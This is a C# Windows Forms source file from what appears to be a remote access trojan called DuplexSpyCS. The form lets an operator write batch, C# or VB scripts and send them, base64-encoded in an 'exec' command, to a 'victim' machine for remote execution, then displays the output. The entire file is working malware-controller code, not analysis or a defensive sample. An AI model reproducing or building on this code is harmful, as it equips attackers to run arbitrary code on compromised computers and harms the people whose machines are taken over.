using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using ICSharpCode.TextEditor;

namespace DuplexSpyCS
{
    public partial class frmRunScript : Form
    {
        public clsVictim v;

        private TextEditorControl editor_code;

        public frmRunScript(clsVictim victim)
        {
            InitializeComponent();

            v = victim;
        }

        public void DisplayOutput(int code, string output)
        {
            try
            {
                if (code == 0)
                {
                    throw new Exception(output);
                }

                Invoke(new Action(() =>
                {
                    richTextBox1.Text = output;
                }));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        void setup()
        {
            editor_code = new TextEditorControl();
            tabControl1.TabPages[0].Controls.Add(editor_code);
            editor_code.Dock = DockStyle.Fill;

            comboBox1.SelectedIndex = 1;
        }

        private void frmRunScript_Load(object sender, EventArgs e)
        {
            setup();
        }

        //RUN SCRIPT
        private void button1_Click(object sender, EventArgs e)
        {
            string method = string.Empty;
            switch (comboBox1.SelectedIndex)
            {
                case 0:
                    method = "bat";
                    break;
                case 1:
                    method = "cs";
                    break;
                case 2:
                    method = "vb";
                    break;
            }

            v.SendCommand($"exec|{method}|{clsCrypto.b64E2Str(editor_code.Text)}|{clsCrypto.b64E2Str(textBox1.Text)}");
        }
    }
}
